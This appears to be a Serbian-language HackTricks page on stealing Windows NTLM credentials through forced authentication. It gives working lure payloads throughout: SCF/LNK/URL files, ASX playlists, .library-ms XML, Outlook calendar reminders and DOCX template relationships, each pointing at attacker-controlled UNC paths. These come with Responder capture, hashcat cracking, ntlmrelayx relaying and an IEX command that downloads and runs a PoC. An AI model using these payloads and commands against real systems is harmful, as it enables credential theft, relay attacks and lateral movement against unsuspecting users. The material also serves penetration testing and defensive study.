# Mesta za krađu NTLM akreditiva

{{#include ../../banners/hacktricks-training.md}}

**Pogledajte sve sjajne ideje na [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/), od preuzimanja Microsoft Word datoteke sa interneta do izvora NTLM leak-ova: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md i [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### SMB share sa dozvolom za upis + UNC mamci koje aktivira Explorer (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Ako možete da **pišete u share koji korisnici ili zakazani poslovi pregledaju u Explorer-u**, ubacite datoteke čiji metapodaci upućuju na vaš UNC (npr. `\\ATTACKER\share`). Prikazivanje fascikle pokreće **implicitnu SMB autentifikaciju** i šalje **NetNTLMv2** vašem listener-u.<sup>[[1]](#references)</sup>

1. **Generišite mamce** (pokriva SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/itd.)

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```

2. **Postavite ih na deljeni resurs sa dozvolom za upis** (u bilo koju fasciklu koju žrtva otvori):

```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```

3. **Slušajte i crackujte**:

```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```

Windows može istovremeno da pristupi većem broju datoteka; za sve što Explorer pregleda (`BROWSE TO FOLDER`) nisu potrebni klikovi.

### Windows Media Player plej-liste (.ASX/.WAX)

Ako možete da navedete cilj da otvori ili pregleda Windows Media Player plej-listu koju kontrolišete, možete da izazovete leak Net‑NTLMv2 tako što ćete stavku usmeriti na UNC putanju. WMP će pokušati da preuzme navedeni medij preko SMB-a i implicitno će se autentifikovati.<sup>[[3]](#references)[[4]](#references)</sup>

Primer payload-a:

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

Tok prikupljanja i cracking:

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer nebezbedno obrađuje .library-ms datoteke kada se otvore direktno iz ZIP arhive. Ako definicija biblioteke upućuje na udaljenu UNC putanju (npr. \\attacker\share), samo pregledanje/pokretanje .library-ms datoteke unutar ZIP arhive navodi Explorer da nabroji UNC putanju i pošalje NTLM autentifikaciju napadaču. Time se dobija NetNTLMv2 koji se može razbiti offline ili potencijalno relay-ovati.<sup>[[2]](#references)</sup>

Minimalna .library-ms datoteka koja upućuje na UNC putanju napadača

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.2\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

Оперативни кораци
- Направите .library-ms датотеку са XML-ом изнад (подесите своју IP адресу/име хоста).
- Запакујте је у ZIP (у Windows-у: Send to → Compressed (zipped) folder) и испоручите ZIP мети.
- Покрените listener за хватање NTLM-а и сачекајте да жртва отвори .library-ms из ZIP-а.


### Путања до звука подсетника у Outlook календару (CVE-2023-23397) – zero-click Net-NTLMv2 leak

Microsoft Outlook for Windows је обрађивао проширено MAPI својство PidLidReminderFileParameter у календарским ставкама. Ако је то својство указивало на UNC путању (нпр., \\attacker\share\alert.wav), Outlook би се повезао са SMB дељеним ресурсом када би се подсетник активирао, чиме би процурио корисников Net-NTLMv2 без икаквог клика. Ово је закрпљено 14. марта 2023, али је и даље веома релевантно за застареле/неажуриране системе и за ретроспективну истрагу инцидената.<sup>[[5]](#references)</sup>

Брза експлоатација помоћу PowerShell-а (Outlook COM):

```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```

Na strani slušaoca:

```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```

Beleške
- Potrebno je samo da žrtvi bude pokrenut Outlook za Windows kada se podsetnik aktivira.
- Ovim leak-om se dobija Net‑NTLMv2, pogodan za offline cracking ili relay (ne za pass-the-hash).


### .LNK/.URL zero-click NTLM leak zasnovan na ikonama (CVE‑2025‑50154 – zaobilaženje CVE‑2025‑24054)

Windows Explorer automatski prikazuje ikone prečica. Nedavna istraživanja pokazala su da je, čak i nakon Microsoftove zakrpe iz aprila 2025. za prečice sa UNC ikonama, i dalje bilo moguće pokrenuti NTLM autentifikaciju bez ijednog klika tako što se cilj prečice hostuje na UNC putanji, a ikona ostavi lokalno (zaobilaženju zakrpe dodeljen je CVE‑2025‑50154). Dovoljno je samo prikazati fasciklu da bi Explorer preuzeo metapodatke sa udaljenog cilja i poslao NTLM napadačevom SMB serveru.<sup>[[6]](#references)</sup>

Minimalni payload za Internet Shortcut (.url):

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```

Kreiranje payload-a prečice (.lnk) pomoću PowerShell-a:

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```

Ideje za isporuku
- Stavite prečicu u ZIP arhivu i navedite žrtvu da je pregleda.
- Postavite prečicu na deljeni resurs sa dozvolom za upis koji će žrtva otvoriti.
- Kombinujte je sa drugim fajlovima-mamcima u istoj fascikli kako bi Explorer prikazao njihove preglede.

### No-click .LNK NTLM leak putem ExtraData putanje do ikone (CVE‑2026‑25185)

Windows učitava metapodatke `.lnk` fajla tokom **pregleda/prikaza** (iscrtavanja ikone), a ne samo prilikom izvršavanja. CVE‑2026‑25185 prikazuje putanju parsiranja u kojoj blokovi **ExtraData** navode shell da razreši putanju do ikone i pristupi sistemu datoteka **tokom učitavanja**, izazivajući odlaznu NTLM autentifikaciju kada je putanja udaljena.

Ključni uslovi za aktiviranje (uočeni u `CShellLink::_LoadFromStream`):
- Uključite **DARWIN_PROPS** (`0xa0000006`) u ExtraData (uslov za pokretanje rutine ažuriranja ikone).
- Uključite **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) sa popunjenim poljem **TargetUnicode**.
- Učitavač proširuje promenljive okruženja u `TargetUnicode` i poziva `PathFileExistsW` nad dobijenom putanjom.

Ako se `TargetUnicode` razreši u UNC putanju (npr. `\\attacker\share\icon.ico`), **samo pregled fascikle** koja sadrži prečicu izaziva odlaznu autentifikaciju. Ista putanja učitavanja može se aktivirati i **indeksiranjem** i **AV skeniranjem**, što predstavlja praktičnu površinu za no-click leak.<sup>[[7]](#references)</sup>

Alati za istraživanje (parser/generator/UI) dostupni su u projektu **LnkMeMaybe** za pravljenje i pregled ovih struktura bez korišćenja Windows GUI-ja.<sup>[[8]](#references)</sup>


### WebDAV auth coercion / validacija akreditiva putem `davclnt.dll,DavSetCookie`

Izvorni **WebDAV klijent** može se zloupotrebiti da bi se trenutna sesija prijavljivanja primorala na autentifikaciju prema proizvoljnom **HTTP/WebDAV** endpointu:

```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```

Zašto je ovo korisno:
- Na **WebDAV serveru pod kontrolom napadača**, može da pokrene **NTLM preko HTTP-a** bez postavljanja prilagođenog klijenta.
- Na **internim hostovima**, ovo je tih način da **proverite gde se prihvataju ukradeni akreditivi** pre bočnog kretanja.<sup>[[9]](#references)</sup>
- Ova komanda je dobra alternativa kada je **SMB izlazni saobraćaj filtriran**, ali je **HTTP/WebDAV** i dalje dostupan.

Operativne napomene:
- Usluga **WebClient** mora da radi na izvornom hostu.
- `rundll32.exe` učitava `davclnt.dll` i omogućava Windows-u da obavlja WebDAV autentifikaciju koristeći **akreditive trenutnog korisnika**.<sup>[[10]](#references)</sup>
- Ako je usmerite ka infrastrukturi koju kontrolišete, koristite HTTP listener/relay koji podržava NTLM, kao što je:

```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```

Iz perspektive detekcije, ponovljena pokretanja `rundll32.exe davclnt.dll,DavSetCookie` prema mnogim internim sistemima snažan su pokazatelj **validacije akreditiva / pripreme za lateralno kretanje nalik na password spraying**, a ne uobičajenog ponašanja korisnika.<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection (.docx/.dotm) radi iznuđivanja NTLM autentifikacije

Office dokumenti mogu da upućuju na spoljni predložak. Ako priloženi predložak podesite na UNC putanju, otvaranje dokumenta pokrenuće autentifikaciju putem SMB-a.

Minimalne izmene DOCX relacija (unutar word/):

1) Izmenite word/settings.xml i dodajte referencu na priloženi predložak:

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

2) Izmenite word/_rels/settings.xml.rels i usmerite rId1337 na svoj UNC:

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

3) Repackujte u .docx i isporučite. Pokrenite svoj SMB capture listener i sačekajte da se fajl otvori.

Za ideje o relaying ili abusing NTLM nakon capture-a pogledajte:

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – Mamci preko share-a koji omogućava upis + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 do DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP NTLM leak → NTFS junction do webroot RCE → FullPowers + GodPotato do SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 NTLM ranjivosti: Nezakrpane pretnje eskalacije privilegija u Microsoft-u](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft ublažava Outlook EoP (CVE‑2023‑23397) i objašnjava NTLM leak putem PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero-click, jedan NTLM: zaobilaženje Microsoft-ove bezbednosne zakrpe (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: Pregled CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – Kada IT podrška pozove: Analiza ModeloRAT kampanje od Teams-a do kompromitovanja domena](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – zaglavlje davclnt.h](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows Rundll32 WebDAV zahtev](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Zanimljiva mesta za krađu Netntlm hash-eva](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
{{#include ../../banners/hacktricks-training.md}}
